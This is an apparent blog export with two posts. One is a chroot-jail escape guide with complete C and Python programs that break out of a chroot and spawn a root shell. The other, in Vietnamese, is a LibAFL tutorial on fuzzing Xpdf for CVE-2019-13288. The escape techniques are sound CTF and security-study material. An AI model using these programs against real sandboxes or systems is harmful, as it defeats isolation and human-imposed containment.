[{"content":" 1 - GTFO Bins # List of Unix binaries that can be used to bypass local security restrictions in misconfigured systems.\nGTFOBins\n2 - Performing Chroot inside chroot jail # Description: Need to be root inside chroot to escape from it by creating another chroot. Because 2 chroot cannot coexist (in Linux). So when create a folder and then create a new chroot inside it, will you pop out of the jail and be able to read file in fs.\nChallenge example: Challenge\ngcc available, so write a C file to perform a chroot and pop out of chrooted enviroment. We need to using C to compile chroot because normally chroot binary is not available in chrooted enviroment. Compile, upload, execute is recommended.\n#include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; //gcc break_chroot.c -o break_chroot int main(void) { mkdir(\u0026#34;chroot-dir\u0026#34;, 0755); chroot(\u0026#34;chroot-dir\u0026#34;); for(int i = 0; i \u0026lt; 1000; i++) { chdir(\u0026#34;..\u0026#34;); } chroot(\u0026#34;.\u0026#34;); system(\u0026#34;/bin/bash\u0026#34;); } #!/usr/bin/python import os os.mkdir(\u0026#34;chroot-dir\u0026#34;) os.chroot(\u0026#34;chroot-dir\u0026#34;) for i in range(1000): os.chdir(\u0026#34;..\u0026#34;) os.chroot(\u0026#34;.\u0026#34;) os.system(\u0026#34;/bin/bash\u0026#34;) The above program will:\nCreate a chroot environment. Change directory to a path relatively outside of the chroot environment. (to reach the root file system outside of chroot environment) Enter chroot to access the root file system. 3 - Root + Saved fd # Similar to the previous case, but in this case the attacker stores a file descriptor to the current directory and then creates the chroot in a new folder. Finally, as he has access to that FD outside of the chroot, he access it and he escapes.\n#include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;errno.h\u0026gt; int main(void) { mkdir(\u0026#34;tmpdir\u0026#34;, 0755); int dir_fd = open(\u0026#34;.\u0026#34;, O_RDONLY); if(chroot(\u0026#34;tmpdir\u0026#34;)){ perror(\u0026#34;chroot\u0026#34;); } fchdir(dir_fd); close(dir_fd); for(int x = 0; x \u0026lt; 1000; x++) chdir(\u0026#34;..\u0026#34;); chroot(\u0026#34;.\u0026#34;); system(\u0026#34;/bin/bash\u0026#34;); } 4 - Root + Fork + UDS (Unix Domain Sockets) # FD can be passed over Unix Domain Sockets, so:\nCreate a child process (fork) Create UDS so parent and child can talk Run chroot in child process in a different folder In parent proc, create a FD of a folder that is outside of new child proc chroot Pass to child procc that FD using the UDS Child process chdir to that FD, and because it\u0026rsquo;s ouside of its chroot, he will escape the jail #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/socket.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;sys/un.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;sys/syscall.h\u0026gt; #include \u0026lt;sys/wait.h\u0026gt; #define CHROOT_PATH \u0026#34;tmpdir\u0026#34; // Directory for chroot // Function to send FD over socket void send_fd(int socket, int fd) { struct msghdr msg = {0}; struct cmsghdr *cmsg; char buf[CMSG_SPACE(sizeof(int))]; memset(buf, 0, sizeof(buf)); struct iovec io = {.iov_base = \u0026#34;FD\u0026#34;, .iov_len = 2}; msg.msg_iov = \u0026amp;io; msg.msg_iovlen = 1; msg.msg_control = buf; msg.msg_controllen = sizeof(buf); cmsg = CMSG_FIRSTHDR(\u0026amp;msg); cmsg-\u0026gt;cmsg_level = SOL_SOCKET; cmsg-\u0026gt;cmsg_type = SCM_RIGHTS; cmsg-\u0026gt;cmsg_len = CMSG_LEN(sizeof(int)); *((int *)CMSG_DATA(cmsg)) = fd; if (sendmsg(socket, \u0026amp;msg, 0) \u0026lt; 0) { perror(\u0026#34;sendmsg\u0026#34;); exit(EXIT_FAILURE); } } // Function to receive FD from socket int receive_fd(int socket) { struct msghdr msg = {0}; struct cmsghdr *cmsg; char buf[CMSG_SPACE(sizeof(int))]; memset(buf, 0, sizeof(buf)); char dummy[2]; struct iovec io = {.iov_base = dummy, .iov_len = sizeof(dummy)}; msg.msg_iov = \u0026amp;io; msg.msg_iovlen = 1; msg.msg_control = buf; msg.msg_controllen = sizeof(buf); if (recvmsg(socket, \u0026amp;msg, 0) \u0026lt; 0) { perror(\u0026#34;recvmsg\u0026#34;); exit(EXIT_FAILURE); } cmsg = CMSG_FIRSTHDR(\u0026amp;msg); if (cmsg == NULL || cmsg-\u0026gt;cmsg_len != CMSG_LEN(sizeof(int))) { fprintf(stderr, \u0026#34;Invalid message received\\n\u0026#34;); exit(EXIT_FAILURE); } int fd = *((int *)CMSG_DATA(cmsg)); // Verify FD validity if (fcntl(fd, F_GETFD) == -1) { perror(\u0026#34;fcntl\u0026#34;); exit(EXIT_FAILURE); } return fd; } int main() { int sockpair[2]; pid_t pid; // Ensure the chroot directory exists if (mkdir(CHROOT_PATH, 0755) \u0026lt; 0 \u0026amp;\u0026amp; errno != EEXIST) { perror(\u0026#34;mkdir\u0026#34;); exit(EXIT_FAILURE); } if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sockpair) \u0026lt; 0) { perror(\u0026#34;socketpair\u0026#34;); exit(EXIT_FAILURE); } pid = fork(); if (pid \u0026lt; 0) { perror(\u0026#34;fork\u0026#34;); exit(EXIT_FAILURE); } if (pid == 0) { // Child process close(sockpair[0]); // Change root to a new directory (must be root to run chroot) if (chroot(CHROOT_PATH) \u0026lt; 0) { perror(\u0026#34;chroot failed in child process\u0026#34;); exit(EXIT_FAILURE); } if (chdir(\u0026#34;/\u0026#34;) \u0026lt; 0) { perror(\u0026#34;chdir after chroot\u0026#34;); exit(EXIT_FAILURE); } printf(\u0026#34;Child: Chroot changed to %s\\n\u0026#34;, CHROOT_PATH); // Receive FD from parent int received_fd = receive_fd(sockpair[1]); printf(\u0026#34;Child: Received FD %d from parent\\n\u0026#34;, received_fd); // Escape chroot jail if (fchdir(received_fd) \u0026lt; 0) { perror(\u0026#34;fchdir\u0026#34;); exit(EXIT_FAILURE); } printf(\u0026#34;Child: Escaped chroot jail\\n\u0026#34;); for(int x = 0; x \u0026lt; 1000; x++) chdir(\u0026#34;..\u0026#34;); chroot(\u0026#34;.\u0026#34;); // Verify escape by listing current directory char cwd[1024]; if (getcwd(cwd, sizeof(cwd)) != NULL) { printf(\u0026#34;Child: Current working directory: %s\\n\u0026#34;, cwd); system(\u0026#34;/bin/bash\u0026#34;); // Optionally, open bash shell for the child } else { perror(\u0026#34;getcwd\u0026#34;); } close(sockpair[1]); } else { // Parent process close(sockpair[1]); // Open a folder outside the chroot (e.g., /) int fd = open(\u0026#34;/\u0026#34;, O_RDONLY); if (fd \u0026lt; 0) { perror(\u0026#34;open\u0026#34;); exit(EXIT_FAILURE); } printf(\u0026#34;Parent: Opened FD %d for /\\n\u0026#34;, fd); // Send FD to child send_fd(sockpair[0], fd); printf(\u0026#34;Parent: Sent FD to child\\n\u0026#34;); close(fd); close(sockpair[0]); wait(NULL); // Wait for child process to finish } return 0; } 5 - Root + Mount # Mounting root device (/) into a directory inside the chroot jail Chroot into that directory will pop you out of the box #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;sys/mount.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;dirent.h\u0026gt; #define CHROOT_PATH \u0026#34;chroot_env\u0026#34; int main() { char proc_root[256]; char target_root[256]; struct stat own_root_stat, target_root_stat; DIR *proc_dir; struct dirent *entry; int found = 0; if (mkdir(CHROOT_PATH, 0755) \u0026lt; 0 \u0026amp;\u0026amp; errno != EEXIST) { perror(\u0026#34;mkdir\u0026#34;); exit(EXIT_FAILURE); } if (chroot(CHROOT_PATH) \u0026lt; 0) { perror(\u0026#34;chroot\u0026#34;); exit(EXIT_FAILURE); } if (chdir(\u0026#34;/\u0026#34;) \u0026lt; 0) { perror(\u0026#34;chdir\u0026#34;); exit(EXIT_FAILURE); } if (mkdir(\u0026#34;/proc\u0026#34;, 0755) \u0026lt; 0 \u0026amp;\u0026amp; errno != EEXIST) { perror(\u0026#34;mkdir /proc\u0026#34;); exit(EXIT_FAILURE); } if (mount(\u0026#34;proc\u0026#34;, \u0026#34;/proc\u0026#34;, \u0026#34;proc\u0026#34;, 0, NULL) \u0026lt; 0) { perror(\u0026#34;mount /proc\u0026#34;); exit(EXIT_FAILURE); } if (stat(\u0026#34;/\u0026#34;, \u0026amp;own_root_stat) \u0026lt; 0) { perror(\u0026#34;stat /\u0026#34;); exit(EXIT_FAILURE); } proc_dir = opendir(\u0026#34;/proc\u0026#34;); if (!proc_dir) { perror(\u0026#34;opendir /proc\u0026#34;); exit(EXIT_FAILURE); } while ((entry = readdir(proc_dir)) != NULL) { if (!isdigit(entry-\u0026gt;d_name[0])) { continue; } snprintf(proc_root, sizeof(proc_root), \u0026#34;/proc/%s/root\u0026#34;, entry-\u0026gt;d_name); if (stat(proc_root, \u0026amp;target_root_stat) == 0) { if (own_root_stat.st_ino != target_root_stat.st_ino) { found = 1; snprintf(target_root, sizeof(target_root), \u0026#34;/proc/%s/root\u0026#34;, entry-\u0026gt;d_name); break; } } } closedir(proc_dir); if (!found) { fprintf(stderr, \u0026#34;No suitable PID found for escaping chroot.\\n\u0026#34;); exit(EXIT_FAILURE); } printf(\u0026#34;Using %s for escaping chroot.\\n\u0026#34;, target_root); if (chroot(target_root) \u0026lt; 0) { perror(\u0026#34;chroot to target root\u0026#34;); exit(EXIT_FAILURE); } printf(\u0026#34;Successfully escaped chroot! Current directory:\\n\u0026#34;); system(\u0026#34;ls /\u0026#34;); system(\u0026#34;/bin/bash\u0026#34;); return 0; } 6 - Root(?) + Fork # Create a Fork (child proc) and chroot into a different folder deeper in the FS and CD on it From the parent process, move the folder where the child process is in a folder previous to the chroot of the children This children process will find himself outside of the chroot #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #define CHROOT_DIR \u0026#34;chroot_env\u0026#34; #define NESTED_DIR \u0026#34;nesteddir\u0026#34; #define NEW_DIR \u0026#34;moved_out\u0026#34; // Function to move the child process to the real root int movetotheroot() { for (int i = 0; i \u0026lt; 10; i++) { if (chdir(\u0026#34;..\u0026#34;) \u0026lt; 0) { perror(\u0026#34;[Child] movetotheroot: chdir\u0026#34;); return -1; } } return 0; } int main() { pid_t pid; char child_path[256]; // Create directory structure printf(\u0026#34;[+] Creating directories...\\n\u0026#34;); mkdir(CHROOT_DIR, 0755); snprintf(child_path, sizeof(child_path), \u0026#34;/%s/%s\u0026#34;, CHROOT_DIR, NESTED_DIR); mkdir(child_path, 0755); // Fork process printf(\u0026#34;[+] Forking process...\\n\u0026#34;); pid = fork(); if (pid \u0026lt; 0) { perror(\u0026#34;fork\u0026#34;); exit(EXIT_FAILURE); } if (pid == 0) { // Child process printf(\u0026#34;[Child] Chrooting into %s...\\n\u0026#34;, CHROOT_DIR); if (chroot(CHROOT_DIR) \u0026lt; 0) { perror(\u0026#34;[Child] chroot\u0026#34;); exit(EXIT_FAILURE); } if (chdir(\u0026#34;/nesteddir\u0026#34;) \u0026lt; 0) { perror(\u0026#34;[Child] chdir\u0026#34;); exit(EXIT_FAILURE); } printf(\u0026#34;[Child] Inside chroot, sleeping...\\n\u0026#34;); sleep(2); // Wait for the parent to move the directory printf(\u0026#34;[Child] Attempting to escape chroot...\\n\u0026#34;); if (movetotheroot() \u0026lt; 0) { perror(\u0026#34;[Child] Failed to move to real root\u0026#34;); exit(EXIT_FAILURE); } if (chroot(\u0026#34;.\u0026#34;) \u0026lt; 0) { perror(\u0026#34;[Child] chroot to real root\u0026#34;); exit(EXIT_FAILURE); } printf(\u0026#34;[Child] Escaped chroot! Current directory:\\n\u0026#34;); system(\u0026#34;ls /\u0026#34;); system(\u0026#34;/bin/bash\u0026#34;); exit(EXIT_SUCCESS); } else { // Parent process sleep(1); // Wait for the child to enter chroot printf(\u0026#34;[Parent] Moving %s to %s...\\n\u0026#34;, NESTED_DIR, NEW_DIR); if (rename(child_path, NEW_DIR) \u0026lt; 0) { perror(\u0026#34;[Parent] rename\u0026#34;); exit(EXIT_FAILURE); } // Wait for the child to complete wait(NULL); printf(\u0026#34;[Parent] Cleanup complete.\\n\u0026#34;); } return 0; } ","date":"20 November 2024","externalUrl":null,"permalink":"/posts/chroot_jailbreak/","section":"Posts","summary":"Some of technique to break out of the chroot\u0026rsquo;s jail","title":"Chroot Jailbreaking","type":"posts"},{"content":"","date":"20 November 2024","externalUrl":null,"permalink":"/tags/jailbreak/","section":"Tags","summary":"","title":"Jailbreak","type":"tags"},{"content":"","date":"20 November 2024","externalUrl":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":"","date":"20 November 2024","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"20 November 2024","externalUrl":null,"permalink":"/","section":"y198","summary":"","title":"y198","type":"page"},{"content":"","date":"27 November 2023","externalUrl":null,"permalink":"/tags/libafl/","section":"Tags","summary":"","title":"Libafl","type":"tags"},{"content":" tags: libafl # Background # ƒê√¢y l√† l·∫ßn ƒë·∫ßu ti√™n m√¨nh ti·∫øp c·∫≠n v·ªõi m·∫£ng fuzzing, tr∆∞·ªõc ƒë√¢y th√¨ m√¨nh hay reverse audit chay ƒë·ªÉ t√¨m bug, nh∆∞ng sau khi m√¨nh ch∆°i pwn2own l√†m v·ªõi target source base l·ªõn th√¨ m√¨nh nh·∫≠n ra audit chay kh√° l√† \u0026ldquo;th·ªçt\u0026rdquo; so v·ªõi c√°c ƒë·ªôi kh√°c v√† m√¨nh quy·∫øt ƒë·ªãnh s·∫Ω th·ª≠ s·ª©c v·ªõi fuzzing.\nM√¨nh c√≥ h·ªèi s·∫øp m√¨nh v√† s·∫øp m√¨nh g·ª£i √Ω cho m√¨nh h·ªçc LibAFL. V·ªÅ LibAFL th√¨ v√†o th√°ng 8 nƒÉm 2021, Antonio Morales ƒë√£ t·∫°o m·ªôt c√°i repo Fuzzing 101 v·ªõi m·ª•c ƒë√≠ch l√† t·∫°o ra c√°c challenge li√™n quan ƒë·∫øn nh·ªØng ki·∫øn th·ª©c v√† basic skill c·ªßa fuzzing d√†nh cho nh·ªØng ai mu·ªën h·ªçc n√≥ v√† s·ª≠ d·ª•ng n√≥ ƒë·ªÉ t√¨m ra c√°c vulnerabilities. Repo n√†y t·∫≠p trung v√†o c√°ch s·ª≠ d·ª•ng c·ªßa AFL++ nh∆∞ng trong series m√¨nh vi·∫øt v·ªõi m·ª•c ƒë√≠ch l√† solve nh·ªØng challenge s·ª≠ d·ª•ng LibAFL thay v√¨ l√† AFL++.\nTrong series n√†y th√¨ m√¨nh s·∫Ω t√¨m hi·ªÉu c√°c th∆∞ vi·ªán v√† vi·∫øt fuzzers b·∫±ng ng√¥n ng·ªØ Rust, m√¨nh s·∫Ω c·ªë g·∫Øng solve c√°c challenges g·∫ßn gi·ªëng v·ªõi solution nh·∫•t m√† m√¨nh c√≥ th·ªÉ l√†m ƒë∆∞·ª£c.\nV√† trong series n√†y m√¨nh s·∫Ω s·ª≠ d·ª•ng ng√¥n ng·ªØ Rust ƒë·ªÉ vi·∫øt fuzzers. N·∫øu nh∆∞ b·∫°n ch∆∞a bi·∫øt Rust v√† Fuzzers l√† g√¨ th√¨ m√¨nh khuy·∫øn kh√≠ch b·∫°n n√™n t√¨m hi·ªÉu v·ªÅ n√≥ tr∆∞·ªõc khi ƒë·ªçc nh·ªØng g√¨ ti·∫øp theo.\nRust: Rust Book Fuzzing: What is fuzzing\nAbout LibAFL # LibAFL l√† m·ªôt s·ª± c·∫£i ti·∫øn t·ª´ AFL++ ƒë∆∞·ª£c vi·∫øt b·∫±ng ng√¥n ng·ªØ Rust. N√≥ nhanh h∆°n, ƒëa d·∫°ng n·ªÅn t·∫£ng, no_std compatibles v√† n√≥ t·∫≠n d·ª•ng t·ªët ngu·ªìn t√†i nguy√™n c·ªßa m√°y.\nƒê·ªÉ hi·ªÉu r√µ h∆°n v·ªÅ LibAFL b·∫°n c√≥ th·ªÉ coi c√°i n√†y Fuzzers Like Lego @rC3\nObjective # M·ª•c ƒë√≠ch c·ªßa fuzzers ch√∫ng ta l·∫ßn n√†y ƒë√≥ l√† g√¢y ra crash v√† t·∫°o PoC cho CVE-2019-13288 trong XPDF 3.02.\nIn Xpdf 4.01.01, the Parser::getObj() function in Parser.cc may cause infinite recursion via a crafted file. A remote attacker can leverage this for a DoS attack. This is similar to CVE-2018-16646.\nD·ª±a v√†o m√¥ t·∫£ c·ªßa l·ªó h·ªïng th√¨ n√¥m na n√≥ ch·ª©a 1 bug c√≥ th·ªÉ g√¢y ra infinite recursion th√¥ng qua file pdf. V·∫≠y PoC ta c·∫ßn ƒë√≥ l√† t·∫°o ra 1 file pdf c√≥ th·ªÉ g√¢y ra crash.\nPrequesite # Rust installation: # curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh\nAFL++ installation: # Dependencies: sudo apt-get update sudo apt-get install -y python3-pip cmake build-essential git gcc sudo apt-get install -y build-essential python3-dev automake cmake git flex bison libglib2.0-dev libpixman-1-dev python3-setuptools cargo libgtk-3-dev # try to install llvm 14 and install the distro default if that fails sudo apt-get install -y lld-14 llvm-14 llvm-14-dev clang-14 || sudo apt-get install -y lld llvm llvm-dev clang sudo apt-get install -y gcc-$(gcc --version|head -n1|sed \u0026#39;s/\\..*//\u0026#39;|sed \u0026#39;s/.* //\u0026#39;)-plugin-dev libstdc++-$(gcc --version|head -n1|sed \u0026#39;s/\\..*//\u0026#39;|sed \u0026#39;s/.* //\u0026#39;)-dev sudo apt-get install -y ninja-build # for QEMU mode Build AFL++: git clone https://github.com/AFLplusplus/AFLplusplus \u0026amp;\u0026amp; cd AFLplusplus export LLVM_CONFIG=\u0026#34;llvm-config-15\u0026#34; make distrib sudo make install N·∫øu nh∆∞ b·∫°n g·∫∑p l·ªói v·ªõi unicornafl th√¨ h√£y th·ª≠ downgrade version c·ªßa python xu·ªëng 3.10.8.\ncurl https://pyenv.run | bash pyenv install 3.10.8 pyenv global 3.10.8 Test installation: cd ~ export PATH=$PATH :~/AFLplusplus afl-fuzz -h Result:\ngh0st@pl4y-Gr0und:~$ afl-fuzz -h afl-fuzz++4.09a based on afl by Michal Zalewski and a large online community afl-fuzz [ options ] -- /path/to/fuzzed_app [ ... ] Required parameters: -i dir - input directory with test cases (or \u0026#39;-\u0026#39; to resume, also see AFL_AUTORESUME) -o dir - output directory for fuzzer findings Execution control settings: -P strategy - set fix mutation strategy: explore (focus on new coverage), exploit (focus on triggering crashes). You can also set a number of seconds after without any finds it switches to exploit mode, and back on new coverage (default: 1000) -p schedule - power schedules compute a seed\u0026#39;s performance score: fast(default), explore, exploit, seek, rare, mmopt, coe, lin quad -- see docs/FAQ.md for more information -f file - location read by the fuzzed program (default: stdin or @@) -t msec - timeout for each run (auto-scaled, default 1000 ms). Add a \u0026#39;+\u0026#39; to auto-calculate the timeout, the value being the maximum. -m megs - memory limit for child process (0 MB, 0 = no limit [default]) -O - use binary-only instrumentation (FRIDA mode) -Q - use binary-only instrumentation (QEMU mode) -U - use unicorn-based instrumentation (Unicorn mode) -W - use qemu-based instrumentation with Wine (Wine mode) -X - use VM fuzzing (NYX mode - standalone mode) -Y - use VM fuzzing (NYX mode - multiple instances mode) Mutator settings: -a - target input format, \u0026#34;text\u0026#34; or \u0026#34;binary\u0026#34; (default: generic) -g minlength - set min length of generated fuzz input (default: 1) -G maxlength - set max length of generated fuzz input (default: 1048576) -D - enable deterministic fuzzing (once per queue entry) -L minutes - use MOpt(imize) mode and set the time limit for entering the pacemaker mode (minutes of no new finds). 0 = immediately, -1 = immediately and together with normal mutation. Note: this option is usually not very effective -c program - enable CmpLog by specifying a binary compiled for it. if using QEMU/FRIDA or the fuzzing target is compiled for CmpLog then use \u0026#39;-c 0\u0026#39;. To disable Cmplog use \u0026#39;-c -\u0026#39;. -l cmplog_opts - CmpLog configuration values (e.g. \u0026#34;2ATR\u0026#34;): 1=small files, 2=larger files (default), 3=all files, A=arithmetic solving, T=transformational solving, X=extreme transform solving, R=random colorization bytes. Fuzzing behavior settings: -Z - sequential queue selection instead of weighted random -N - do not unlink the fuzzing input file (for devices etc.) -n - fuzz without instrumentation (non-instrumented mode) -x dict_file - fuzzer dictionary (see README.md, specify up to 4 times) Test settings: -s seed - use a fixed seed for the RNG -V seconds - fuzz for a specified time then terminate -E execs - fuzz for an approx. no. of total executions then terminate Note: not precise and can have several more executions. Other stuff: -M/-S id - distributed mode (-M sets -Z and disables trimming) see docs/fuzzing_in_depth.md#c-using-multiple-cores for effective recommendations for parallel fuzzing. -F path - sync to a foreign fuzzer queue directory (requires -M, can be specified up to 32 times) -T text - text banner to show on the screen -I command - execute this command/script when a new crash is found -C - crash exploration mode (the peruvian rabbit thing) -b cpu_id - bind the fuzzing process to the specified CPU core (0-...) -e ext - file extension for the fuzz test input file (if needed) To view also the supported environment variables of afl-fuzz please use \u0026#34;-hh\u0026#34;. Compiled with Python 3.11.4 module support, see docs/custom_mutators.md Compiled without AFL_PERSISTENT_RECORD support. Compiled with shmat support. For additional help please consult docs/README.md :) Setup our target # cd ~ mkdir fuzzing-101 cd fuzzing-101 cargo init fuzzing-101 s·∫Ω l√† directory root c√°i m√† l∆∞u tr·ªØ c√°c challenge trong project c·ªßa ch√∫ng ta.\nTrong directory n√†y ch√∫ng ta s·∫Ω ch·ªânh file Cargo.toml sao cho workspace n·∫±m ·ªü trong directory n√†y.\nfuzzing-101/Cargo.toml [workspace] members = [ \u0026#34;exercise-1\u0026#34;, ] [profile.release] lto = true codegen-units = 1 opt-level = 3 debug = true lto = true: S·ª≠ d·ª•ng Link-Time Optimization (t·ªëi ∆∞u h√≥a th·ªùi gian li√™n k·∫øt). ƒêi·ªÅu n√†y c√≥ th·ªÉ c·∫£i thi·ªán hi·ªáu su·∫•t b·∫±ng c√°ch t·ªëi ∆∞u h√≥a to√†n b·ªô ch∆∞∆°ng tr√¨nh t·∫°i th·ªùi ƒëi·ªÉm li√™n k·∫øt. codegen-units = 1: ƒê·∫∑t s·ªë l∆∞·ª£ng ƒë∆°n v·ªã m√£ h√≥a ƒë·ªÉ bi√™n d·ªãch ch∆∞∆°ng tr√¨nh. Trong tr∆∞·ªùng h·ª£p n√†y, ch·ªâ c√≥ m·ªôt ƒë∆°n v·ªã. opt-level = 3: ƒê·∫∑t c·∫•p ƒë·ªô t·ªëi ∆∞u h√≥a l√† 3. C·∫•p ƒë·ªô t·ªëi ∆∞u h√≥a cao nh·∫•t, th∆∞·ªùng d√†nh cho release ƒë·ªÉ t·ªëi ∆∞u h√≥a hi·ªáu su·∫•t. debug = true: B·∫≠t debug information trong phi√™n b·∫£n release. Sau khi xong th√¨ ch√∫ng ta t·∫°o solution project cho challenge 1.\ncargo new exercise-1\nInstall Xpdf # Download Xpdf 3.02 # cd fuzzing-101/exercise-1 wget https://dl.xpdfreader.com/old/xpdf-3.02.tar.gz tar -xvf xpdf-3.02.tar.gz rm xpdf-3.02.tar.gz mv xpdf-3.02 xpdf Sau khi th·ª±c hi·ªán c√°c b∆∞·ªõc tr√™n th√¨ b·∫°n s·∫Ω c√≥ source c·ªßa Xpdf 3.02 n·∫±m trong directory xpdf\nFuzzing setup # Cargo.toml # exercise-1/cargo.toml\n[package] name = \u0026#34;exercise-one-solution\u0026#34; version = \u0026#34;0.1.0\u0026#34; edition = \u0026#34;2021\u0026#34; [dependencies] libafl = { version = \u0026#34;0.10.1\u0026#34; } Makefile.toml # exercise-1/Makefile.toml\nC√≥ m·ªôt tool kh√° l√† hay m√¨nh t√¨m ƒë∆∞·ª£c ƒë√≥ l√† Cargo make. Thay v√¨ ch√∫ng ta s·ª≠ d·ª•ng build nh∆∞ th√¥ng th∆∞·ªùng (d√πng file build.rs ho·∫∑c l√† d√πng commandline) th√¨ ch√∫ng ta c√≥ th·ªÉ s·ª≠ d·ª•ng cargo make ƒë·ªÉ c√≥ th·ªÉ build project m·ªôt c√°ch t·ª± ƒë·ªông.\nInstallation:\ncargo install --force cargo-make V√≠ d·ª• ƒë·ªÉ build xpdf v·ªõi commandline:\ncd fuzzing-101-solutions/exercise-1/xpdf make clean rm -rf install export LLVM_CONFIG=llvm-config-15 CC=afl-clang-fast CXX=afl-clang-fast++ ./configure --prefix=./install make make install Th√¨ chuy·ªÉn sang file Makefile.toml n√≥ s·∫Ω nh∆∞ th·∫ø n√†y\n# composite tasks [tasks.clean] dependencies = [\u0026#34;cargo-clean\u0026#34;, \u0026#34;afl-clean\u0026#34;, \u0026#34;clean-xpdf\u0026#34;] [tasks.cargo-clean] command = \u0026#34;cargo\u0026#34; args = [\u0026#34;clean\u0026#34;] [tasks.afl-clean] script = \u0026#39;\u0026#39;\u0026#39; rm -rf .cur_input* timeouts \u0026#39;\u0026#39;\u0026#39; [tasks.clean-xpdf] cwd = \u0026#34;xpdf\u0026#34; script = \u0026#34;\u0026#34;\u0026#34; make --silent clean rm -rf built-with-* ../build/* ${CARGO_MAKE_WORKING_DIRECTORY}/xpdf/install \u0026#34;\u0026#34;\u0026#34; [tasks.build] dependencies = [\u0026#34;afl-clean\u0026#34;, \u0026#34;clean-xpdf\u0026#34;, \u0026#34;build-xpdf\u0026#34;, \u0026#34;build-fuzzer\u0026#34;] [tasks.build-xpdf] cwd = \u0026#34;xpdf\u0026#34; script = \u0026#34;\u0026#34;\u0026#34; export LLVM_CONFIG=llvm-config-15 CC=afl-clang-fast CXX=afl-clang-fast++ ./configure --prefix=${CARGO_MAKE_WORKING_DIRECTORY}/xpdf/install make make install \u0026#34;\u0026#34;\u0026#34; [tasks.build-fuzzer] script = \u0026#34;\u0026#34;\u0026#34; cargo build --release \u0026#34;\u0026#34;\u0026#34; V√† vi·ªác c√≤n l·∫°i c·ªßa ch√∫ng ta ch·ªâ c·∫ßn l√†m l√†\ncargo make build\nN√≥ s·∫Ω ch·∫°y c√°c t√°c v·ª• b√™n trong n√≥ bao g·ªìm afl-clean, clean-xpdf, build-xpdf v√† build-fuzzer\n[tasks.build] dependencies = [\u0026#34;afl-clean\u0026#34;, \u0026#34;clean-xpdf\u0026#34;, \u0026#34;build-xpdf\u0026#34;, \u0026#34;build-fuzzer\u0026#34;] Sau khi ch·∫°y th√†nh c√¥ng th√¨ ch√∫ng ta s·∫Ω c√≥ ƒë∆∞·ª£c c√°c binary file c·ªßa xpdf\nCorpus # Corpus l√† n∆°i m√† c√°c testcases c·ªßa ch√∫ng ta ƒë∆∞·ª£c l∆∞u t·∫°i ƒë√≥. Ch√∫ng ta xem c√°c testcase l√† input c·ªßa ch√∫ng ta, m·ªôt corpus c√≥ th·ªÉ l∆∞u tr·ªØ c√°c testcases ·ªü nhi·ªÅu d·∫°ng, c√≥ th·ªÉ l∆∞u tr·ª±c ti·∫øp tr√™n th∆∞ m·ª•c th√†nh file, memory,\u0026hellip;. Trong exercise-1 th√¨ corpus s·∫Ω l∆∞u tr·ªØ c√°c file pdf ƒë·ªÉ c√≥ th·ªÉ th·ª±c thi c√°c file binary c·ªßa xpdf.\ninstall corpus:\ncd fuzzing-101-solutions/exercise-1 mkdir corpus cd corpus wget https://github.com/mozilla/pdf.js-sample-files/raw/master/helloworld.pdf wget http://www.africau.edu/images/default/sample.pdf wget https://www.melbpc.org.au/wp-content/uploads/2017/10/small-example-pdf-file.pdf Ch√∫ng ta ch·ªâ c·∫ßn m·ªôt v√†i sample ƒë·ªÉ l√†m input cho fuzzer.\nFuzz Everything # M·ªçi th·ª© ƒë√£ setup ok, ch√∫ng ta ƒëi v√†o ph·∫ßn cu·ªëi, ƒë√≥ l√† vi·∫øt file fuzz ƒë·ªÉ t√¨m ra PoC g√¢y crash.\nFile main.rs s·∫Ω ch·ªãu tr√°ch nhi·ªám cho vi·ªác fuzzing, ch√∫ng ta s·∫Ω s·ª≠ d·ª•ng c√°c component kh√°c nhau ƒë·ªÉ ti·∫øn h√†nh fuzz. Trong file main.rs m√¨nh s·ª≠ d·ª•ng concept c·ªßa forkserver_simple.\nD·ª±a v√†o concept tr√™n th√¨ component c·ªßa m√¨nh s·∫Ω bao g·ªìm: Corpus \u0026amp; Input, Observer, Feedback, Objective, State, Monitor, EventManager, Scheduler, Fuzzer, Executor, Mutator, Stage.\nTrong main.rs m√¨nh s·∫Ω c·ªë g·∫Øng gi·∫£i th√≠ch r√µ c√°c components m√† m√¨nh s·ª≠ d·ª•ng v√† c√°ch n√≥ li√™n k·∫øt v·ªõi √Ω t∆∞·ªüng c·ªßa fuzzing c·ªßa m√¨nh.\n1st Component: Corpus \u0026amp; Input # Tr∆∞·ªõc khi b·∫Øt ƒë·∫ßu cho t·∫•t c·∫£ m·ªçi th·ª© ch√∫ng ta c·∫ßn ph·∫£i x√°c ƒë·ªãnh input v√† output cho fuzzing. Input ·ªü ƒë√¢y ƒë√≥ ch√≠nh l√† c√°c file sample pdf trong exercise-1/corpus. ƒê·ªÉ l·∫•y c√°c sample trong corpus th√¨ m√¨nh s·ª≠ d·ª•ng InMemoryCorpus ƒë·ªÉ tr√°nh vi·ªác reads or writes v√†o trong directory, vi·ªác n√†y s·∫Ω c·∫£i 